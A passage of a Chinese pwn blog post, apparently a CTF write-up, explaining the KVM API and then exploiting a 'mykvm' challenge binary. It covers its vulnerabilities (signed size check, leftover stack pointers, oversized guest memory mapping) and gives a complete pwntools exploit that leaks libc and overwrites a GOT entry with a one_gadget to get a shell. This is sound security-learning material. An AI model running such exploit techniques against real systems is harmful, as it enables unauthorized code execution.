<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(mem, code, <span class="keyword">sizeof</span>(code));</span><br></pre></td></tr></table></figure>
<p>使用 KVM_SET_USER_MEMORY_REGION 通知 KVM 虚拟机有4096字节的内存：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_userspace_memory_region</span> <span class="title">region</span>=</span> &#123;</span><br><span class="line">    .slot = <span class="number">0</span>,</span><br><span class="line">    .guest_phys_addr= <span class="number">0x1000</span>,</span><br><span class="line">    .memory_size = <span class="number">0x1000</span>,</span><br><span class="line">    .userspace_addr = (<span class="keyword">uint64_t</span>)mem,</span><br><span class="line">&#125;;</span><br><span class="line">ret = ioctl(vmfd, KVM_SET_USER_MEMORY_REGION, &amp;region); </span><br><span class="line"><span class="comment">/* KVM_SET_USER_MEMORY_REGION:0x4020ae46 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>slot 字段表示 KVM 中内存空间的索引：<ul>
<li>当我们使用相同的 slot 调用 KVM_SET_USER_MEMORY_REGION 时会替换掉这个 mapping，当使用新的 slot 调用 KVM_SET_USER_MEMORY_REGION 时会创建新的 mapping</li>
</ul>
</li>
<li>guest_phys_addr 虚机中的基础物理地址</li>
<li>userspace_addr 指向我们通过 mmap 申请的内存，注意这是一个 64-bit 的值</li>
<li>memory_size 表示要映射的内存的大小：0x1000字节</li>
</ul>
<p>现在我们的 VM 中有内存，内存中有要运行的代码，现在我们创建一个 VCPU 去运行这些代码，KVM 提供给我们控制这个 VCPU 的文件描述符，0 表示虚拟 CPU 的索引，索引的最大值可通过 KVM_CAP_MAX_VCPUS 获得：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vcpufd= ioctl(vmfd, KVM_CREATE_VCPU, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>); </span><br><span class="line"><span class="comment">/* KVM_CREATE_VCPU:0xae41 */</span></span><br></pre></td></tr></table></figure>
<p>每个虚拟CPU都关联一个 kvm_run 结构体，这个结构体用来在内核和用户空间传递 CPU 的信息，尤其是当硬件虚拟化停止时(vmexit)，kvm_run 结构体包含停止原因</p>
<p>我们将这个结构体通过 mmap 映射到用户空间，首先我们通过 KVM_GET_VCPU_MMAP_SIZE 得知有多少内存需要映射：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mmap_size = ioctl(kvm, KVM_GET_VCPU_MMAP_SIZE, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">/* KVM_GET_VCPU_MMAP_SIZE:0xae04 */</span></span><br></pre></td></tr></table></figure>
<p>一般 mmap_size 大于 kvm_run 结构体的大小，因为内核会使用这片区域去存其它的瞬态信息，使用 mmap 映射 kvm_run 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run = mmap(<span class="literal">NULL</span>, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, vcpufd, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/* PROT_READ|PROT_WRITE:3 */</span></span><br><span class="line"><span class="comment">/* MAP_SHARED:1 */</span></span><br></pre></td></tr></table></figure>
<p>VCPU 同样包括寄存器，KVM 将寄存器分为两类：标准寄存器和特殊寄存器，分别使用 kvm_regs 和 kvm_sregs 结构体表示，在运行我们的代码前要先初始化这个寄存器</p>
<ul>
<li>初始化特殊寄存器：我们只需设置 cs 寄存器，将 cs 的 base 和 selector 设为“0”</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ret = ioctl(vcpufd, KVM_GET_SREGS, &amp;sregs);</span><br><span class="line">sregs.cs.base = <span class="number">0</span>;</span><br><span class="line">sregs.cs.selector = <span class="number">0</span>;</span><br><span class="line">ret = ioctl(vcpufd, KVM_SET_SREGS, &amp;sregs);</span><br><span class="line"><span class="comment">/* KVM_SET_SREGS:0x8138ae83 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>初始化标准寄存器：我们大部分设为“0”，instruction pointer 设为“0x1000”，al 和 bl 设为“2”，flags 寄存器设置为“2”</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_regs</span> <span class="title">regs</span> =</span> &#123;</span><br><span class="line">    .rip = <span class="number">0x1000</span>,</span><br><span class="line">    .rax = <span class="number">2</span>,</span><br><span class="line">    .rbx = <span class="number">2</span>,</span><br><span class="line">    .rflags = <span class="number">0x2</span>,</span><br><span class="line">&#125;;</span><br><span class="line">ret = ioctl(vcpufd, KVM_SET_REGS, &amp;regs);</span><br><span class="line"><span class="comment">/* KVM_SET_REGS:0x4090ae82 */</span></span><br></pre></td></tr></table></figure>
<p>创建 VM 和 VCPU、映射和初始化内存、并设置初始寄存器状态后，我们现在可以使用 KVM_RUN 开始使用 VCPU 运行指令</p>
<p>每次虚拟化停止时，它都会返回，因此我们将在循环中运行它：（根据停止原因进行相应的处理）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    ret = ioctl(vcpufd, KVM_RUN, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* KVM_RUN:0xae80 */</span></span><br><span class="line">    <span class="keyword">switch</span> (run-&gt;exit_reason) &#123; <span class="comment">/* kvm_run结构体包含停止原因 */</span></span><br><span class="line">        <span class="comment">/* Handle exit */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://lwn.net/Articles/658511/">使用 KVM API</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhang_syi/article/details/52718329?spm=1001.2014.3001.5502">KVM学习1—安装编译测试kvm模块</a> </li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhang_syi/article/details/52718366">KVM学习2—使用KVM API创建并运行虚拟机</a> </li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhang_syi/article/details/52718377?spm=1001.2014.3001.5502">KVM学习3—编写简单在虚拟机中学习的汇编程序</a> </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> request, ...)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>fd：文件描述符 </li>
<li>request：命令码，应用程序通过下发命令码来控制驱动程序完成对应操作</li>
<li>“…”：是可变参数 arg，一些情况下应用程序需要向驱动程序传参，参数就通过 ag 来传递</li>
<li>返回值：驱动程序中 ioctl 接口给的返回值，驱动程序可以通过返回值向用户程序传参，ioctl 运行失败时一定会返回“-1”并设置全局变量 errorno</li>
</ul>
<p><strong>关于汇编的知识</strong></p>
<p>MOVZX 指令（进行全零扩展并传送）将源操作数复制到目的操作数，并把目的操作数0扩展到16位或32位（这条指令只用于无符号整数）</p>
<ul>
<li>下图展示了如何将源操作数进行全零扩展，并送入16位目的操作数：</li>
</ul>
<img src="/2022/07/12/KVM%20pwn/1657603737686.png" class width="1657603737686"> 
<p>MOVSX 指令（进行符号扩展并传送）将源操作数内容复制到目的操作数，并把目的操作数符号扩展到16位或32位（这条指令只用于有符号整数）</p>
<ul>
<li>下图展示了如何将源操作数进行符号扩展（符号位为“1”），并送入16位目的操作数：</li>
</ul>
<img src="/2022/07/12/KVM%20pwn/1657603860296.png" class width="1657603860296"> 
<p>全零扩展：零扩展就是全补零，不论其符号位是多少，高位全都补 “0”</p>
<p>符号扩展：当用更多的内存存储某一个有符号数时，由于符号位位于该数的第一位，扩展之后，符号位仍然需要位于第一位：</p>
<ul>
<li>当扩展一个负数时，需要将扩展的高位全赋为 “1”</li>
<li>当扩展一个正数时（包括无符号数），符号扩展和零扩展是一样的，因为符号位就是 “0”</li>
</ul>
<p>案例：</p>
<ul>
<li>用8位二进制表示 “-1”，则是  11111111 </li>
<li>用16位二进制表示时，则为 11111111 11111111 高位全都是 “1”，这个叫做符号扩展，主要用于对齐操作数</li>
</ul>
<p>汇编语言中，CPU 对外设的操作通过专门的端口读写指令来完成：读端口用 IN 指令，写端口用 OUT 指令</p>
<p><strong>漏洞分析</strong></p>
<p>漏洞点一：负数溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;your code size: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;kvm);                 <span class="comment">// int</span></span><br><span class="line"><span class="keyword">if</span> ( kvm.size &lt;= <span class="number">4096</span> )                     <span class="comment">// int</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;your code: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, kvm.code, kvm.size);              <span class="comment">// unsigned int,负数溢出</span></span><br><span class="line">  kvm.name = input_line(<span class="string">&quot;guest name: &quot;</span>);</span><br><span class="line">  kvm.name = input_line(<span class="string">&quot;guest passwd: &quot;</span>);</span><br><span class="line">  pwn(kvm.code, kvm.size);</span><br><span class="line">  kvm.name = input_line(<span class="string">&quot;host name: &quot;</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, kvm.name, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>令 kvm.size = -1，下一个 read 就会有栈溢出</li>
<li>不过有 canary 的限制，不能直接利用</li>
</ul>
<p>漏洞点二：没有置空</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Struct kvm; <span class="comment">// [rsp+4h] [rbp-101Ch] BYREF</span></span><br><span class="line"><span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+1018h] [rbp-8h]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>Struct kvm 在栈上占用的范围很大，其中包含了大量存留指针</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(</span><br><span class="line">  (&amp;code_bss - (((((&amp;code_bss &gt;&gt; <span class="number">0x1F</span>) &gt;&gt; <span class="number">0x14</span>) + &amp;code_bss) &amp; <span class="number">0xFFF</span>) - ((&amp;code_bss &gt;&gt; <span class="number">0x1F</span>) &gt;&gt; <span class="number">0x14</span>)) + <span class="number">0x1000</span>),</span><br><span class="line">  code,</span><br><span class="line">  size);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>memcpy 中的 size 我们可以控制</li>
<li>只要 size 足够大，就可以把栈上的指针 copy 到 bss 段（方便后续利用）</li>
</ul>
<p>漏洞点三：越界</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">region.slot = <span class="number">0</span>;</span><br><span class="line">region.flags = <span class="number">0</span>;</span><br><span class="line">region.guest_phys_addr = <span class="number">0LL</span>;</span><br><span class="line">region.memory_size = <span class="number">0x40000000</span>LL;            <span class="comment">// 这里肯定有溢出</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>memory_size 表示要映射的内存的大小：0x40000000 字节</li>
<li>映射内存范围过大，导致 guest 代码能访问到宿主机的 bss 段中的其他变量 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0000000000602100</span> ??                            code_bss db    ? ;                      ; DATA XREF: pwn+<span class="number">8</span>C↑o</span><br><span class="line">    ......</span><br><span class="line">.bss:<span class="number">000000000060</span>A100 ?? ?? ?? ?? ?? ?? ?? ??       dest dq ?                               ; DATA XREF: main+<span class="number">7</span>E↑w</span><br></pre></td></tr></table></figure>
<ul>
<li>很明显可以通过 code_bss 访问到 dest</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>首先肯定要先 leak libc_base，然后通过 code_bss 的溢出来覆盖 dest（可以是 got 或者 hook）</p>
<p>然后在以下代码中输入 one_gadget 就可以了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kvm.name = input_line(<span class="string">&quot;host name: &quot;</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(dest, kvm.name, <span class="number">0x20</span>uLL); </span><br></pre></td></tr></table></figure>
<p>问题的关键就是：写一段由 VCPU 运行的 code 来进行泄露</p>
<p>先使用以下一段 code 进行测试，看看到底泄露了什么东西</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">code=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        .code16</span></span><br><span class="line"><span class="string">        lable:</span></span><br><span class="line"><span class="string">            mov al,byte ptr ds:[bx]</span></span><br><span class="line"><span class="string">            out 0,al</span></span><br><span class="line"><span class="string">            add bx,1</span></span><br><span class="line"><span class="string">            cmp bx,0x200</span></span><br><span class="line"><span class="string">            jna lable</span></span><br><span class="line"><span class="string">        hlt</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>利用汇编指令 <code>out</code> 把 al 寄存器中的值输出到 [标准输出]</li>
</ul>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bbbbbbbb</span><br><span class="line">\x8a\x07�\x00\x83$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>发现泄露的数据是从 0x603000 开始的</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x603000</span></span><br><span class="line"><span class="number">0x603000</span>:	<span class="number">0x8101c38300e6078a</span>	<span class="number">0x0000f4f3760200fb</span></span><br><span class="line"><span class="number">0x603010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>而距离它偏移为 0x358 的地方就有前面 copy 进去的存留指针</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0x603000</span> <span class="number">0x603358</span></span><br><span class="line"><span class="number">0x603000</span>-&gt;<span class="number">0x603358</span> is <span class="number">0x358</span> bytes (<span class="number">0x6b</span> words)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>那么进行 leak 的 code 就可以这样写：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">code=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        .code16</span></span><br><span class="line"><span class="string">        mov bx,0x8</span></span><br><span class="line"><span class="string">        mov ax,0x35</span></span><br><span class="line"><span class="string">        mov ds,ax</span></span><br><span class="line"><span class="string">        lable:</span></span><br><span class="line"><span class="string">            mov al,byte ptr ds:[bx]</span></span><br><span class="line"><span class="string">            out 0,al</span></span><br><span class="line"><span class="string">            add bx,1</span></span><br><span class="line"><span class="string">            cmp bx,0x200</span></span><br><span class="line"><span class="string">            jna lable</span></span><br><span class="line"><span class="string">        hlt</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>接下来用同样的思路覆盖 dest：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0x603000</span> <span class="number">0x60A100</span></span><br><span class="line"><span class="number">0x603000</span>-&gt;<span class="number">0x60a100</span> is <span class="number">0x7100</span> bytes (<span class="number">0xe20</span> words)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">code=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        .code16</span></span><br><span class="line"><span class="string">        mov bx,0x8</span></span><br><span class="line"><span class="string">        mov ax,0x35</span></span><br><span class="line"><span class="string">        mov ds,ax</span></span><br><span class="line"><span class="string">        mov ax,0x710</span></span><br><span class="line"><span class="string">        mov ss,ax</span></span><br><span class="line"><span class="string">        lable:</span></span><br><span class="line"><span class="string">            mov al,byte ptr ds:[bx]</span></span><br><span class="line"><span class="string">            out 0,al</span></span><br><span class="line"><span class="string">            add bx,1</span></span><br><span class="line"><span class="string">            cmp bx,0x200</span></span><br><span class="line"><span class="string">            jna lable</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        xor bx,bx</span></span><br><span class="line"><span class="string">        mov al,0x0B</span></span><br><span class="line"><span class="string">        mov ss:[bx+0x0],al</span></span><br><span class="line"><span class="string">        mov al,0x20</span></span><br><span class="line"><span class="string">        mov ss:[bx+0x1],al</span></span><br><span class="line"><span class="string">        mov al,0x60</span></span><br><span class="line"><span class="string">        mov ss:[bx+0x2],al</span></span><br><span class="line"><span class="string">        mov al,0</span></span><br><span class="line"><span class="string">        mov ss:[bx+0x3],al</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        hlt</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>把 dest 覆盖为 got 表地址附近，方便修改 put_got</li>
</ul>
<p>最后还有一个问题，readline() 函数会将相当一部分不可见字符转义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x602000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│             <span class="number">0x602000</span> —▸ <span class="number">0x601e18</span> ◂— <span class="number">0x5858585858585858</span> (<span class="string">&#x27;XXXXXXXX&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rax<span class="number">-3</span> rdi<span class="number">-3</span> <span class="number">0x602008</span> ◂— <span class="number">0x6161616161136168</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│             <span class="number">0x602010</span> ◂— <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaGb&#x27;</span></span><br><span class="line">... ↓                <span class="number">2</span> skipped</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│             <span class="number">0x602028</span> (<span class="built_in">puts</span>@got.plt) ◂— <span class="number">0x7f9eec006247</span> <span class="comment">/* &#x27;Gb&#x27; */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>解决的办法就是：检查 one_gadget 的每一字节，如果是不可见字符则重启程序</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    flag=<span class="number">0</span></span><br><span class="line">    p=process(<span class="string">&#x27;./mykvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    code=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            .code16</span></span><br><span class="line"><span class="string">            mov bx,0x8</span></span><br><span class="line"><span class="string">            mov ax,0x35</span></span><br><span class="line"><span class="string">            mov ds,ax</span></span><br><span class="line"><span class="string">            mov ax,0x710</span></span><br><span class="line"><span class="string">            mov ss,ax</span></span><br><span class="line"><span class="string">            lable:</span></span><br><span class="line"><span class="string">                mov al,byte ptr ds:[bx]</span></span><br><span class="line"><span class="string">                out 0,al</span></span><br><span class="line"><span class="string">                add bx,1</span></span><br><span class="line"><span class="string">                cmp bx,0x200</span></span><br><span class="line"><span class="string">                jna lable</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            xor bx,bx</span></span><br><span class="line"><span class="string">            mov al,0x0B</span></span><br><span class="line"><span class="string">            mov ss:[bx+0x0],al</span></span><br><span class="line"><span class="string">            mov al,0x20</span></span><br><span class="line"><span class="string">            mov ss:[bx+0x1],al</span></span><br><span class="line"><span class="string">            mov al,0x60</span></span><br><span class="line"><span class="string">            mov ss:[bx+0x2],al</span></span><br><span class="line"><span class="string">            mov al,0</span></span><br><span class="line"><span class="string">            mov ss:[bx+0x3],al</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            hlt</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(r,&quot;b*0x400E64&quot;)</span></span><br><span class="line"></span><br><span class="line">    size = <span class="number">0x1000</span></span><br><span class="line">    name = <span class="string">&quot;a&quot;</span>*<span class="number">0x8</span></span><br><span class="line">    passwd = <span class="string">&quot;b&quot;</span>*<span class="number">0x8</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your code size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your code:&quot;</span>,code)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;guest name:&quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;guest passwd:&quot;</span>,passwd)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">    libc_base=leak_addr-<span class="number">0x3d1198</span></span><br><span class="line">    success(<span class="string">&quot;leak_addr: &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    one_gadget=libc_base+<span class="number">0xf1247</span></span><br><span class="line"></span><br><span class="line">    test=one_gadget</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">3</span>):</span><br><span class="line">        char=test%<span class="number">0x100</span></span><br><span class="line">        <span class="keyword">if</span> (char&gt;<span class="number">0x7e</span> <span class="keyword">or</span> char&lt;<span class="number">0x20</span> ):</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        test=test//<span class="number">0x100</span></span><br><span class="line">    <span class="keyword">if</span> (flag==<span class="number">1</span>):</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;host name: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">0x1D</span>+p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>这个题目搭环境花了好长时间，本地打通以后打不通远程，用 gdbserver 调试了一下才发现 heap 环境不一样</p>
<p>学到了不少东西：</p>
<ul>
<li>gdbserver 调试 docker 中的环境</li>
<li>KVM api</li>
<li>一些汇编的知识</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/07/shellcode+socket%E6%9C%AC%E5%9C%B0%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/07/shellcode+socket%E6%9C%AC%E5%9C%B0%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/" class="post-title-link" itemprop="url">shellcode+socket本地进程通信</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

